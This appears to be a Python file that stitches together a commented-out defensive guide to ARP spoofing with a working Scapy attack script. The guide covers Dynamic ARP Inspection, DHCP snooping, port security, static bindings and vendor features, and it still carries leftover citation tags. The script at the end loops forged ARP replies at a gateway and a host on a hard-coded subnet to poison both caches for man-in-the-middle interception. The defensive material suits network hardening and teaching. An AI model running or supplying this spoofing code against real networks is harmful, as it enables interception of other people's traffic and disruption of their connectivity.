
# Protections in the equipment (switch/router)
# Many modern routers and switches include mechanisms that detect and mitigate ARP spoofing, for example Dynamic ARP Inspection (DAI) or ARP validation that blocks inconsistent ARP replies; port security that locks a MAC to a port and blocks frames from other MACs; and IP/MAC binding or ARP ACLs that associate known IP↔MAC pairs and drop conflicting announcements. 
# Cisco
# +1

# Static ARP entries or bindings
# If a router or host has static ARP entries (or bindings learned/vetted via DHCP snooping), fake ARP replies will be ignored and the session will stay stable — or, if conflict is detected, traffic may drop. 
# Cisco
# +1

# Switching vs. bridging and client isolation
# In networks where client-to-client traffic is blocked (for example Wi-Fi client isolation) or where switching behavior isolates ports, a host may be prevented from seeing or responding to ARP for another host — so some attacks simply can’t reach their target. Conversely, some switches forward unexpected frames differently, changing outcomes. 
# UI Community
# +1

# Host IP stack behavior
# Operating systems and NIC drivers react differently to conflicting ARP: some update their ARP table, some ignore conflicting replies, some mark a conflict and temporarily disable the interface — so identical spoofing attempts can result in different host-side outcomes. 
# ESET Security Forum

# NAT / Proxy ARP / asymmetric routing
# When NAT, proxy ARP, or asymmetric routes are present, the forwarding path may not match ARP expectations, so forcing inconsistent ARP replies can break connectivity or appear ineffective. 
# arubanetworking.hpe.com

# IDS/IPS / firmware protections
# Some routers and firmwares include intrusion-detection/mitigation logic that recognizes MITM/ARP-poisoning patterns and can block or disconnect offending devices. 
# Cisco Meraki Documentation
# +1

# Timing / TTL and concurrency
# ARP cache entries expire; if an attacker’s spoof packets are not sent at the right cadence or are too aggressive, the network’s ARP behavior can be unstable. (This is an explanation of behavior variance — not instruction to attack.) 
# Cisco

# How to prevent ARP spoofing (practical defensive steps)

# Enable Dynamic ARP Inspection (DAI) + DHCP Snooping on managed switches
# DAI validates ARP packets against a trusted DHCP binding database and drops invalid ARP packets. On many enterprise switches (Cisco, Juniper, Aruba, Meraki, Netgear smart switches) this is a first-line defense. Make sure DHCP snooping is enabled because DAI usually depends on its binding table. 
# Cisco
# +2
# Juniper Networks
# +2

# Use Port Security / IP Source Guard
# Lock each access port to a known MAC (or a limited set). IP Source Guard prevents IP spoofing by allowing traffic only if the IP↔MAC binding matches the DHCP snooping database. These features limit what a compromised client can impersonate. 
# Juniper Networks
# +1

# Configure static ARP or IP-MAC binding for critical hosts
# For servers, gateways, and other critical devices, populate static ARP entries or use ARP/IP-MAC binding features in the router so forged ARP replies are ignored. Consumer/SMB routers often call this “IP & MAC Binding” or “ARP Binding.” 
# TP-Link
# +1

# Segment the network & enable client isolation where appropriate
# Put sensitive endpoints on separate VLANs, and enable client isolation on guest Wi-Fi to stop client-to-client spoofing. This reduces the attack surface. 
# Reddit

# Use encrypted protocols end-to-end
# Even when ARP spoofing is possible, using TLS (HTTPS), SSH, and IPSec prevents attackers from reading or tampering with payloads. Don’t rely on link-layer security alone. (Best practice — no vendor doc needed.)

# Monitor ARP activity and alert on anomalies
# Use network monitoring / NMS that detects sudden changes in IP↔MAC mappings (multiple MACs for a single IP or many IPs from one MAC) and alert administrators. Many managed switch platforms export logs you can ingest into SIEM. 
# Cisco

# Keep firmware up to date and enable built-in protections
# Enable router/switch security features and keep firmware current — vendors add mitigations over time. Some consumer routers offer “ARP Spoofing Defense” or “Anti ARP Spoofing.” 
# TP-Link
# +1

# Test only in controlled labs
# For validation, test in an isolated lab (VMs, separate VLAN, or physical test network) that you control. Capture traffic with Wireshark/tcpdump to verify behavior. (Ethics and legality: never test on networks you do not own or have authorization to test.)

# Examples of vendors / products that implement ARP protections

# Cisco Catalyst / IOS switches — DAI, DHCP snooping, IP Source Guard, port security. (Enterprise-grade). 
# Cisco
# +1

# Juniper (EX Series, MX) — supports Dynamic ARP Inspection and IP Source Guard. 
# Juniper Networks
# +1

# Aruba / HPE switches — Dynamic ARP protection/DAI on supported platforms (AOS-CX, etc.). 
# arubanetworking.hpe.com
# +1

# Cisco Meraki MS switches — include DAI support in their managed cloud switches. 
# Cisco Meraki Documentation

# Netgear Smart Managed / Pro switches — have ARP/DAI related protections on managed lines. (Check model documentation.) 
# kb.netgear.com
# +1

# TP-Link (selected consumer/SMB models) — “ARP Spoofing Defense” and IP-MAC binding features on some routers and gateways. Good for small deployments but check model capability. 
# TP-Link
# +1

# Note: Ubiquiti consumer switches generally do not provide full DAI; community threads confirm this limitation — for advanced DAI you’ll need higher-end managed switches. Always verify feature support per model and OS/firmware version. 
# UI Community

# Quick checklist to harden a LAN against ARP spoofing

#  Enable DHCP Snooping on access switches.

#  Enable DAI on VLANs where hosts are untrusted.

#  Configure Port Security & IP Source Guard on access ports.

#  Set static ARP/IP-MAC bindings for gateways and critical servers.

#  Segment hosts into VLANs and enable client isolation on guest Wi-Fi.

#  Monitor ARP changes and generate alerts.

#  Keep firmware updated.
     
import scapy.all as scapy

def get_target_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    finalpacket = broadcast/arp_request
    answer = scapy.srp(finalpacket, timeout=2, verbose=False)[0]
    
    mac = answer[0][1].hwsrc
    

    return mac


def spoof_arp(target_ip, spoofed_ip):
    mac = get_target_mac(target_ip)
    packet = scapy.ARP(op=2, hwdst=mac, pdst=target_ip, psrc=spoofed_ip)
    scapy.send(packet, verbose=False)

def main():
    try:
        while True:
            spoof_arp("192.168.100.1", "192.168.100.6")
            spoof_arp("192.168.100.6", "192.168.100.1")

    except KeyboardInterrupt:
        print('ERROROORORORO')

main()

